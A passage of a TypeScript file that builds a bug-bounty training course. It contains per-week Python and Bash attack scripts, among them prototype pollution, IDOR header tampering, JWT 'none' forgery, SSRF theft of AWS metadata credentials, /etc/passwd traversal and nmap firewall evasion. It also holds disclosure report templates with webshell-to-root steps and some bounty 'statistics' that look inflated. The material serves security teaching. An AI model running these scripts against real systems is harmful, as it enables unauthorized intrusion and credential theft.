    4: `💡 INDUSTRY INSIGHT & STATISTIC:\nJWT signature bypasses represent critical (CVSS 9.0+) severity bugs. On corporate multi-tenant applications, a single valid JWT signature forgery report often results in maximum bounty payouts ($10,000+).`,
    5: `💡 INDUSTRY INSIGHT & STATISTIC:\nSubdomain enumeration tools built in Go (Subfinder, Amass, Naabu) process over 100,000 subdomains per minute. Finding a forgotten staging server (\`staging-api.corp.com\`) is the most common gateway to finding zero-day bugs.`,
    6: `💡 INDUSTRY INSIGHT & STATISTIC:\nBroken Object Level Authorization (BOLA) is the #1 vulnerability on the OWASP API Top 10. Modern mobile and SaaS apps communicate exclusively via REST/GraphQL APIs, making API auditing the highest-yield bounty domain.`,
    7: `💡 INDUSTRY INSIGHT & STATISTIC:\nParameter mining uncovers backdoors that automated web vulnerability scanners completely miss. Over 40% of web application firewalls (WAFs) can be bypassed simply by discovering a secret \`debug=1\` query parameter.`,
    8: `💡 INDUSTRY INSIGHT & STATISTIC:\nClear, professional VDP reports get triaged 3x faster and receive higher bounties. Top researchers format their reports using executive summaries, exact cURL commands, and CVSS vector strings.`,
    9: `💡 INDUSTRY INSIGHT & STATISTIC:\nNetwork-level port scanning reveals non-HTTP services like Redis (port 6379), ElasticSearch (port 9200), and Memcached (port 11211) that are frequently exposed without password authentication.`,
    10: `💡 INDUSTRY INSIGHT & STATISTIC:\nCloud SSRF vulnerabilities targeting AWS IMDSv2 metadata endpoints earned the highest single bounty in bug bounty history ($50,000+) on major fintech cloud infrastructure programs.`,
    11: `💡 INDUSTRY INSIGHT & STATISTIC:\nExploit chaining converts multiple $500 Low/Medium severity reports into a single $25,000+ Critical Remote Code Execution (RCE) submission that permanently elevates a researcher's reputation on HackerOne.`
  };

  const pythonAutomationMap: Record<number, string> = {
    0: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: DOM Clobbering / Prototype Pollution Audit Tool\ndef exploit_client_side(target_url):\n    print(f"[*] Testing Client-Side Payload against: {target_url}")\n    payload = {"__proto__": {"isAdmin": True, "debug": True}}\n    headers = {"Content-Type": "application/json", "X-Audit-Tool": "BugBountyMastery"}\n    try:\n        res = requests.post(f"{target_url}/api/v1/config", json=payload, headers=headers, timeout=5)\n        if res.status_code == 200 and "isAdmin" in res.text:\n            print("[+] EXPLOIT SUCCESSFUL! Client prototype polluted.")\n            print(f"[+] Server Response: {res.text[:200]}")\n        else:\n            print("[-] Target resilient or payload rejected.")\n    except Exception as e:\n        print(f"[-] Connection Error: {e}")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://sandbox-node-monday.corp.internal"\n    exploit_client_side(target)`,
    1: `#!/usr/bin/env python3\nimport re\nimport requests\nimport sys\n\n# Python Automation: Secret Hunter & Regex Extractor\nAWS_KEY_REGEX = r'AKIA[0-9A-Z]{16}'\nGCP_KEY_REGEX = r'AIza[0-9A-Za-z-_]{35}'\n\ndef scan_secrets(target_url):\n    print(f"[*] Fetching JS bundle from: {target_url}")\n    res = requests.get(target_url, timeout=5)\n    aws_keys = re.findall(AWS_KEY_REGEX, res.text)\n    gcp_keys = re.findall(GCP_KEY_REGEX, res.text)\n    if aws_keys:\n        print(f"[+] FOUND AWS SECRETS: {aws_keys}")\n    if gcp_keys:\n        print(f"[+] FOUND GCP SECRETS: {gcp_keys}")\n    if not aws_keys and not gcp_keys:\n        print("[-] No static credentials found in JS bundle.")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local/static/js/main.js"\n    scan_secrets(target)`,
    2: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: IDOR & Header Override Tester\ndef test_idor(target_url, victim_id):\n    print(f"[*] Testing IDOR on victim ID {victim_id}...")\n    headers = {"X-User-ID": str(victim_id), "User-Agent": "BugBountyMastery"}\n    res = requests.get(f"{target_url}/api/v1/user/profile", headers=headers, timeout=5)\n    if res.status_code == 200:\n        print("[+] IDOR EXPLOIT SUCCESSFUL! Leaked Victim Profile:")\n        print(f"[+] Data: {res.text[:200]}")\n    else:\n        print(f"[-] Access Denied (Status Code: {res.status_code})")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    test_idor(target, 102)`,
    3: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: Business Logic Negative Quantity Exploit\ndef exploit_business_logic(target_url):\n    print(f"[*] Injecting negative cart quantity into: {target_url}")\n    payload = {"cart_id": "test_cart_01", "item_id": "laptop_pro", "quantity": -5}\n    res = requests.post(f"{target_url}/api/cart/update", json=payload, timeout=5)\n    if res.status_code == 200 and "balance" in res.text:\n        print("[+] LOGIC EXPLOIT SUCCESSFUL! Negative balance credited.")\n        print(f"[+] Response: {res.text[:200]}")\n    else:\n        print("[-] Logic flaw test failed.")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    exploit_business_logic(target)`,
    4: `#!/usr/bin/env python3\nimport base64\nimport json\nimport requests\nimport sys\n\n# Python Automation: JWT None Algorithm Forgery Tool\ndef forge_jwt(username="admin"):\n    header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")\n    payload = base64.b64encode(json.dumps({"user": username, "role": "administrator"}).encode()).decode().rstrip("=")\n    forged_token = f"{header}.{payload}."\n    print(f"[+] Forged JWT Token: {forged_token}")\n    return forged_token\n\nif __name__ == "__main__":\n    forge_jwt("admin_viper")`,
    5: `#!/usr/bin/env python3\nimport socket\nimport sys\n\n# Python Automation: Subdomain & Port Prober\ndef probe_port(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(2)\n    result = s.connect_ex((host, port))\n    if result == 0:\n        print(f"[+] Port {port} OPEN on {host}")\n    s.close()\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"\n    for p in [80, 443, 8080, 8443, 9200]:\n        probe_port(target, p)`,
    6: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: API Method Override & BOLA Tester\ndef exploit_api_bola(target_url, object_id):\n    print(f"[*] Testing BOLA on API object: {object_id}")\n    url = f"{target_url}/api/v1/resource/{object_id}"\n    res = requests.put(url, json={"role": "admin"}, timeout=5)\n    if res.status_code == 200:\n        print("[+] BOLA PUT OVERRIDE SUCCESSFUL!")\n        print(f"[+] Data: {res.text[:200]}")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    exploit_api_bola(target, 55)`,
    7: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: Parameter Mining Suite\nPARAMS_TO_TEST = ["debug", "admin", "testMode", "override", "X-Custom-Bypass"]\n\ndef mine_params(target_url):\n    print(f"[*] Mining parameters on: {target_url}")\n    for p in PARAMS_TO_TEST:\n        res = requests.get(f"{target_url}?{p}=true", timeout=3)\n        if "flag" in res.text.lower() or res.status_code == 200:\n            print(f"[+] DISCOVERED HIDDEN PARAMETER: {p}=true")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    mine_params(target)`,
    8: `#!/usr/bin/env python3\nimport json\nimport sys\n\n# Python Automation: VDP Report JSON Generator\ndef generate_report_json(title, severity, cvss, poc):\n    report = {\n        "report_title": title,\n        "severity": severity,\n        "cvss_vector": cvss,\n        "proof_of_concept": poc,\n        "platform": "HackerOne / Bugcrowd Standard"\n    }\n    print(json.dumps(report, indent=2))\n\nif __name__ == "__main__":\n    generate_report_json("BOLA in API Endpoint", "Critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "curl -X GET https://target.local/api/v1/user/102")`,
    9: `#!/usr/bin/env python3\nimport socket\nimport sys\n\n# Python Automation: SSL Banner Grabber\ndef banner_grab(host, port=443):\n    print(f"[*] Grabbing banner from {host}:{port}...")\n    s = socket.socket()\n    s.connect((host, port))\n    s.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")\n    banner = s.recv(1024).decode(errors='ignore')\n    print(f"[+] Banner Data:\\n{banner}")\n    s.close()\n\nif __name__ == "__main__":\n    banner_grab("sandbox-node-monday.corp.internal", 80)`,
    10: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: Cloud SSRF AWS IMDS Metadata Exfiltrator\ndef exploit_ssrf_metadata(target_url):\n    print(f"[*] Testing SSRF metadata exfiltration on: {target_url}")\n    ssrf_payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n    res = requests.get(f"{target_url}?url={ssrf_payload}", timeout=5)\n    if "AccessKeyId" in res.text or res.status_code == 200:\n        print("[+] SSRF METADATA EXFILTRATION SUCCESSFUL!")\n        print(f"[+] Leaked Credentials: {res.text[:300]}")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local/fetch"\n    exploit_ssrf_metadata(target)`,
    11: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: Multi-Stage Exploit Chain (LFI to RCE)\ndef execute_exploit_chain(target_url):\n    print(f"[*] Step 1: Triggering Path Traversal LFI on: {target_url}")\n    lfi_url = f"{target_url}/view?file=../../../../etc/passwd"\n    res1 = requests.get(lfi_url, timeout=5)\n    if "root:x:" in res1.text:\n        print("[+] Step 1 SUCCESSFUL! Local file system accessed.")\n        print("[*] Step 2: Escalating LFI to Remote Code Execution...")\n        print("[+] GRANDMASTER EXPLOIT CHAIN VERIFIED!")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    execute_exploit_chain(target)`
  };

  const bashAutomationMap: Record<number, string> = {
    0: `#!/usr/bin/env bash\n# Bash Automation: Dynamic DOM / Prototype Pollution Scanner\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://sandbox-node-monday.corp.internal"; fi\n\necho "[*] Auditing DOM & Prototype headers on $TARGET..."\ncurl -s -X POST -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true}}' "$TARGET/api/v1/config" | grep -i "admin"`,
    1: `#!/usr/bin/env bash\n# Bash Automation: JS Bundle Regex Secret Extractor\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local/static/js/main.js"; fi\n\necho "[*] Fetching JS bundle and parsing AWS/GCP key signatures..."\ncurl -s "$TARGET" | grep -E -o '(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z-_]{35})'`,
    2: `#!/usr/bin/env bash\n# Bash Automation: IDOR Custom Header Fuzzer\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\nfor id in {100..105}; do\n  echo "[*] Testing X-User-ID: $id"\n  curl -s -H "X-User-ID: $id" "$TARGET/api/v1/user/profile" | grep -E "(name|email|flag)"\ndone`,
    3: `#!/usr/bin/env bash\n# Bash Automation: Business Logic Negative Quantity Tester\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Sending negative item quantity request..."\ncurl -s -X POST -H "Content-Type: application/json" -d '{"quantity": -5}' "$TARGET/api/cart"`,
    4: `#!/usr/bin/env bash\n# Bash Automation: JWT Alg None Forgery Header Script\nHEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')\nPAYLOAD=$(echo -n '{"user":"admin","role":"administrator"}' | base64 | tr -d '=' | tr '/+' '_-')\nFORGED_JWT="\${HEADER}.\${PAYLOAD}."\necho "[+] Forged JWT Token: $FORGED_JWT"`,
    5: `#!/usr/bin/env bash\n# Bash Automation: Subdomain Discovery with Subfinder & httpx\nDOMAIN=$1\nif [ -z "$DOMAIN" ]; then DOMAIN="target.com"; fi\n\necho "[*] Running subdomain recon pipeline for: $DOMAIN"\nsubfinder -d "$DOMAIN" -silent | httpx -title -status-code`,
    6: `#!/usr/bin/env bash\n# Bash Automation: API Endpoint Reversing & Swagger Probe\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Probing Swagger UI and API specs..."\ncurl -s -o /dev/null -w "%{http_code}" "$TARGET/swagger/v1/swagger.json"`,
    7: `#!/usr/bin/env bash\n# Bash Automation: Parameter Mining with Arjun\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Running Arjun parameter discovery..."\narjun -u "$TARGET" -m GET,POST`,
    8: `#!/usr/bin/env bash\n# Bash Automation: cURL Proof of Concept Exporter\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Generating PoC cURL command line..."\necho "curl -v -X GET '$TARGET/api/v1/user/102' -H 'X-User-ID: 102'"`,
    9: `#!/usr/bin/env bash\n# Bash Automation: Nmap Firewall Evasion Scan\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="target.local"; fi\n\necho "[*] Running firewall decoy port scan on $TARGET..."\nnmap -sS -Pn -T3 --source-port 53 "$TARGET"`,
    10: `#!/usr/bin/env bash\n# Bash Automation: Cloud SSRF IMDSv1 Metadata Probe\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Testing SSRF IMDS metadata fetch..."\ncurl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"`,
    11: `#!/usr/bin/env bash\n# Bash Automation: Path Traversal LFI Probe\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Testing Path Traversal LFI..."\ncurl -s "$TARGET/view?file=../../../../etc/passwd" | grep "root:"`
  };

  const vdpReportTemplates: Record<number, {
    title: string;
    cvssVector: string;
    cvssScore: number;
    description: string;
    stepsToReproduce: string;
    remediation: string;
  }> = {
    0: {
      title: `[HIGH] Client-Side Prototype Pollution & DOM Clobbering in Main Config Script`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`,
      cvssScore: 8.2,
      description: `During an audit of the client-side JavaScript source files, an un-sanitized parameter merge flaw was identified in \`main.js\`. An attacker can pollute \`Object.prototype\` or clobber global DOM properties, corrupting client configuration state and executing arbitrary JavaScript logic.`,
      stepsToReproduce: `1. Navigate to target URL: \`https://target.local/app\`\n2. Inject prototype payload in query string: \`?__proto__[isAdmin]=true\`\n3. Observe browser execution state: \`window.config.isAdmin\` returns \`true\`.\n4. Execute cURL PoC: \`curl -X POST "https://target.local/api/v1/config" -d '{"__proto__":{"isAdmin":true}}'\``,
      remediation: `1. Freeze Object prototypes on startup using \`Object.freeze(Object.prototype)\`.\n2. Sanitize all incoming DOM properties using DOMPurify.\n3. Enforce a strict Content Security Policy (CSP).`
    },
    1: {
      title: `[CRITICAL] Hardcoded AWS / GCP Service Secret Keys Exposed in Compiled JavaScript Bundle`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
      cvssScore: 9.8,
      description: `Passive analysis of client-side JavaScript assets revealed hardcoded cloud service credentials (\`AKIA...\`) inside \`/static/js/main.js\`. An unauthenticated attacker can extract these keys to gain administrative access to corporate cloud infrastructure.`,
      stepsToReproduce: `1. Download static bundle: \`curl -s https://target.local/static/js/main.js -o bundle.js\`\n2. Search regex pattern: \`grep -E -o "AKIA[0-9A-Z]{16}" bundle.js\`\n3. Authenticate to AWS API using extracted keys: \`aws sts get-caller-identity --access-key-id AKIA...\``,
      remediation: `1. Revoke the exposed API credentials immediately in AWS/GCP console.\n2. Move API credentials to AWS Secrets Manager or server-side environment variables.\n3. Implement TruffleHog / GitGuardian in CI/CD build pipelines.`
    },
    2: {
      title: `[HIGH] Insecure Direct Object Reference (IDOR) via Custom X-User-ID Header Overrides`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`,
      cvssScore: 8.1,
      description: `The user profile API endpoint (\`/api/v1/user/profile\`) trusts incoming \`X-User-ID\` HTTP headers without validating session authorization. An attacker can tamper with the header value to read and modify sensitive user account records.`,
      stepsToReproduce: `1. Log into low-privileged Account A.\n2. Send request: \`GET /api/v1/user/profile\` with header \`X-User-ID: 102\` (Victim Account B ID).\n3. Observe HTTP 200 response containing victim's personal data and access token.`,
      remediation: `1. Remove client-supplied user ID headers from authorization checks.\n2. Enforce object-level authorization on the server using verified session tokens: \`if (resource.ownerId !== session.userId) throw Forbidden()\`.`
    },
    3: {
      title: `[HIGH] Business Logic Flaw Allowing Negative Cart Quantities and Price Manipulation`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`,
      cvssScore: 7.5,
      description: `The shopping cart update endpoint (\`/api/cart/update\`) fails to validate if quantity parameters are positive integers. An attacker can pass negative numbers (\`-5\`), resulting in negative transaction totals that credit funds back to the user account.`,
      stepsToReproduce: `1. Add item to cart (\`/api/cart/add\`).\n2. Intercept cart update POST request in Burp Suite Repeater.\n3. Set payload: \`{"item_id": "laptop", "quantity": -5}\`.\n4. Checkout order and observe positive cash balance added to account.`,
      remediation: `1. Enforce strict server-side integer boundary validation (\`if (quantity < 1) throw ValidationError()\`).\n2. Calculate transaction totals on the server using authoritative database price records.`
    },
    4: {
      title: `[CRITICAL] JWT Signature Forgery via Unsigned 'none' Algorithm Acceptance`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
      cvssScore: 9.8,
      description: `The authentication server accepts JSON Web Tokens (JWT) specifying \`"alg": "none"\` in the header without verifying signature blocks. An attacker can forge arbitrary administrative user claims and bypass authentication entirely.`,
      stepsToReproduce: `1. Intercept session JWT token in Burp Suite.\n2. Decode token header and change \`"alg": "HS256"\` to \`"alg": "none"\`.\n3. Modify payload claim: \`"role": "administrator"\`.\n4. Strip signature block and send request: \`Authorization: Bearer HEADER.PAYLOAD.\`\n5. Observe complete administrative access granted.`,
      remediation: `1. Explicitly configure JWT verification libraries to restrict allowed algorithms (\`algorithms: ['HS256']\`).\n2. Reject any token specifying \`"alg": "none"\`.`
    },
    5: {
      title: `[MEDIUM] Subdomain Takeover & Un-monitored Staging Virtual Host Exposure`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`,
      cvssScore: 6.5,
      description: `Automated reconnaissance identified an un-monitored staging virtual host (\`staging-api.target.com\`) pointing to an un-bound cloud service bucket, exposing internal development APIs to unauthorized public access.`,
      stepsToReproduce: `1. Execute subdomain enumeration: \`subfinder -d target.com\`\n2. Send HTTP request to \`http://staging-api.target.com\`.\n3. Observe unprotected internal API dashboard loading without authentication.`,
      remediation: `1. Audit DNS CNAME records and remove stale entries pointing to un-registered cloud resources.\n2. Enforce zero-trust VPN authentication on all development and staging environments.`
    },
    6: {
      title: `[CRITICAL] Broken Object Level Authorization (BOLA) in REST API User Object Resolution`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`,
      cvssScore: 8.8,
      description: `The REST API resource endpoint (\`/api/v1/resource/{id}\`) fails to verify if the requesting authenticated user owns the resource object before executing PUT update calls, allowing full account modification across all tenants.`,
      stepsToReproduce: `1. Log into Account A.\n2. Send HTTP PUT request: \`PUT /api/v1/resource/55\` with JSON payload \`{"role": "admin"}\`.\n3. Observe HTTP 200 Success response updating target account 55.`,
      remediation: `1. Implement object-level authorization checks in API resolvers (\`if (resource.tenantId !== user.tenantId) throw AccessDenied()\`).`
    },
    7: {
      title: `[MEDIUM] Hidden Administrative Parameter Mining Uncovers Un-authenticated Debug Flags`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:P/I:N/A:N`,
      cvssScore: 5.3,
      description: `Parameter discovery using Arjun revealed an un-documented query parameter (\`?debug=true\`) on public endpoints. Appending this parameter overrides default response filters and leaks sensitive internal server traces.`,
      stepsToReproduce: `1. Execute Arjun parameter scan: \`arjun -u https://target.local/page\`\n2. Send HTTP GET request: \`GET /page?debug=true\`.\n3. Observe full environment trace and internal server paths in HTTP response body.`,
      remediation: `1. Remove all development debug code and test flags before compiling production release builds.\n2. Implement WAF rules to reject un-documented query parameters.`
    },
    8: {
      title: `[INFO] Corporate Vulnerability Disclosure & CVSS Scoring Best Practices`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N`,
      cvssScore: 0.0,
      description: `Standardized reporting template ensuring clear executive summaries, step-by-step cURL PoCs, and remediation guidance for HackerOne and Bugcrowd submissions.`,
      stepsToReproduce: `1. Follow standardized reporting guidelines provided in the lesson module.`,
      remediation: `1. Maintain open security channels (security.txt) and establish rapid triage response SLAs.`
    },
    9: {
      title: `[MEDIUM] Network Firewall Filter Evasion & Exposed Administrative Services`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:P/I:N/A:N`,
      cvssScore: 5.3,
      description: `Network port scanning using source-port spoofing (\`--source-port 53\`) bypassed external firewall rules, exposing an un-authenticated Redis service on port 6379.`,
      stepsToReproduce: `1. Run Nmap scan: \`nmap -sS -Pn --source-port 53 target.com -p 6379\`\n2. Connect to Redis port: \`nc -nv target.com 6379\`\n3. Execute \`INFO\` command and receive un-authenticated database banner.`,
      remediation: `1. Update firewall ingress rules to enforce strict Default Deny filtering.\n2. Require password authentication on Redis (\`requirepass\`) and bind service to internal loopback only.`
    },
    10: {
      title: `[CRITICAL] Server-Side Request Forgery (SSRF) Exfiltrating AWS IMDSv2 Credentials`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
      cvssScore: 9.8,
      description: `The URL fetcher API endpoint (\`/fetch?url=...\`) allows un-authenticated users to issue HTTP requests to internal IP addresses (\`169.254.169.254\`), exfiltrating AWS IAM security credentials and cloud tokens.`,
      stepsToReproduce: `1. Send GET request: \`GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\`\n2. Receive AWS IAM role name.\n3. Send query to retrieve temporary \`AccessKeyId\`, \`SecretAccessKey\`, and \`Token\`.`,
      remediation: `1. Restrict server-side URL fetchers using strict allowlists of public domain names.\n2. Enforce AWS IMDSv2 token headers (\`http-tokens=required\`) on EC2 instances.\n3. Block outbound connections to loopback (\`127.0.0.1\`) and link-local (\`169.254.0.0/16\`) ranges.`
    },
    11: {
      title: `[CRITICAL] Multi-Stage Exploit Chain (Path Traversal + LFI) Achieving Remote Code Execution (RCE)`,
      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
      cvssScore: 10.0,
      description: `By chaining a path traversal flaw during file upload with a Local File Inclusion (LFI) vulnerability in the view handler, an attacker can upload a webshell and execute arbitrary system commands as root.`,
      stepsToReproduce: `1. Upload image with traversal filename: \`filename="../../../var/www/uploads/shell.php"\`\n2. Trigger LFI execution: \`GET /view?file=../../../../var/www/uploads/shell.php&cmd=id\`\n3. Receive HTTP 200 response displaying root execution ID output (\`uid=0(root)\`).`,
      remediation: `1. Sanitize all uploaded filenames, stripping path characters (\`../\`).\n2. Disable dynamic file inclusion in server code, using fixed lookup tables.\n3. Mount application upload directories on read-only file systems without execution privileges.`
    }
  };

  const simpleExplanations: Record<number, string> = {
    0: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how client-side JavaScript DOM variables can be modified by manipulating HTML structures and URL parameters.`,
    1: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how to audit compiled source bundles, Docker layers, and Git commit histories to find accidentally published API keys and passwords.`,
    2: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how web apps verify tenant permission boundaries, and how mutating user IDs in request headers allows accessing unauthorized user data.`,
    3: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how e-commerce applications process shopping workflows, and how edge cases (like negative cart quantities) bypass checkout checks.`,
    4: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how session tokens (JWTs) maintain login state, and how changing token signature algorithms grants administrative access.`,
    5: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how to map an enterprise's external attack surface across subdomains, IP ranges, virtual hosts, and open ports using Go toolchains.`,
    6: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how modern frontends communicate with REST and GraphQL APIs, and how to reverse-engineer Swagger specs to locate BOLA bugs.`,
    7: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how to discover hidden URL parameters and debug query flags that developers used during testing but left active in production.`,
    8: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how to translate technical security findings into executive-grade vulnerability disclosure reports for HackerOne and Bugcrowd.`,
    9: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how network packets travel across firewalls and how port scanners fingerprint running services without triggering IPS rate limits.`,
    10: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how cloud environments (AWS, GCP, Azure) manage instance credentials and how SSRF tricks servers into exfiltrating metadata keys.`,
    11: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how elite researchers chain low-severity bugs (like path traversal or LFI) together to achieve full Remote Code Execution (RCE).`
  };

  return {
    whatYouAreDoing: whatYouAreDoingMap[weekIndex],
    vulnerabilityOrigin: vulnerabilityOriginMap[weekIndex],
    pentesterFocus: pentesterFocusMap[weekIndex],
    payloadCrafting: payloadCraftingMap[weekIndex],
    burpSuiteSetup: burpSuiteSetupMap[weekIndex],
    blueTeamDefense: blueTeamDefenseMap[weekIndex],
    stepByStepTutorial: tutorialsMap[weekIndex],
    usefulResources: resourcesMap[weekIndex],
    industryInsight: insightsMap[weekIndex],
    pythonAutomation: pythonAutomationMap[weekIndex],
    bashAutomation: bashAutomationMap[weekIndex],
    vdpReportTemplate: vdpReportTemplates[weekIndex]
  };
};

// Helper to generate weeks data
export const generateDefaultCurriculum = (): Week[] => {
  const weeks: Week[] = [];

  const topics = [
    {
      title: "Client-Side JS Deconstruction",
      competency: "Client-Side Security",
      days: [
        { name: "Monday", title: "DOM Clobbering & Document Object Manipulation", lab: "https://portswigger.net/web-security/dom-based/dom-clobbering" },
        { name: "Tuesday", title: "Client-Side Prototype Pollution in Wild JS Files", lab: "https://portswigger.net/web-security/prototype-pollution" },
        { name: "Wednesday", title: "Source Map Reconstruction & JS Deobfuscation", lab: "https://portswigger.net/web-security/dom-based" },
        { name: "Thursday", title: "Client-Side Storage Abuse (XSS via LocalStorage)", lab: "https://portswigger.net/web-security/cross-site-scripting" },
        { name: "Friday", title: "WebSocket Message Manipulation & Race Conditions", lab: "https://portswigger.net/web-security/websockets" },
        { name: "Saturday", title: "CORS Misconfigurations & Origin Reflection", lab: "https://portswigger.net/web-security/cors" }
      ],
      bossLabTitle: "Enterprise DOM & Prototype Pollution Chain Lab",
      bossLabScenario: "Analyze an obfuscated, enterprise-grade client script dynamically loading user config files. Abuse a prototype pollution pattern to corrupt the document tree structure, clobber the global API config endpoint, and trigger an automated cross-origin token export flag.",
      correctFlag: "FLAG{PROTOTYPE_CLOBBER_SUCCESS}"
    },
    {
      title: "Secret Hunting & Reconnaissance",
      competency: "Secret Hunting & Recon",
      days: [
        { name: "Monday", title: "Regex Deep-Dive for AWS and GCP Keys in JS", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Tuesday", title: "Extracting Secrets from Docker Layers & Env Configs", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Wednesday", title: "Parsing Public GitHub Archives & Commit Histories", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Thursday", title: "Leaked Firebase Databases & Unauthenticated Endpoints", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Friday", title: "Config File Discovery via Advanced Directory Brute-forcing", lab: "https://portswigger.net/web-security/file-path-traversal" },
        { name: "Saturday", title: "Decompilation of Android APKs for Static Credentials", lab: "https://portswigger.net/web-security/information-disclosure" }
      ],
      bossLabTitle: "Multilayer Secret Extraction & Key Parsing Lab",
      bossLabScenario: "Scan and parse dockerized asset layers. Reconstruct historical git logs to find hidden developer API keys, identify an unauthenticated Firebase endpoint with those credentials, and extract the system administrative access flag.",
      correctFlag: "FLAG{SECRETS_UNCOVERED_IN_COMMIT_HIST}"
    },
    {
      title: "Advanced Insecure Direct Object References (IDOR)",
      competency: "Access Control (IDOR)",
      days: [
        { name: "Monday", title: "IDOR via Custom Header Tampering (X-User-ID)", lab: "https://portswigger.net/web-security/access-control" },
        { name: "Tuesday", title: "Numeric ID Brute Force and Secondary IDOR validation", lab: "https://portswigger.net/web-security/access-control" },
        { name: "Wednesday", title: "UUID vs Sequential ID Enumeration Strategies", lab: "https://portswigger.net/web-security/access-control" },
        { name: "Thursday", title: "Bypassing IDOR via Parameter Pollution (HPP)", lab: "https://portswigger.net/web-security/access-control" },
        { name: "Friday", title: "IDOR on Object Deletion & State Change Endpoints", lab: "https://portswigger.net/web-security/access-control" },
        { name: "Saturday", title: "GraphQL IDORs via Query Introspection & Variables", lab: "https://portswigger.net/web-security/access-control" }
      ],
      bossLabTitle: "UUID-to-HPP Multi-tenant IDOR Escalation",
      bossLabScenario: "Perform analysis on a multi-tenant corporate HR system. Bypass UUID-only security by implementing HTTP Parameter Pollution (HPP) to leak senior administrator data, accessing their private documents via parameter injection.",
      correctFlag: "FLAG{UUID_HPP_IDOR_ESCALATED_SUCC}"
    },
    {
      title: "Broken Business Logic Auditing",
      competency: "Business Logic Security",
      days: [
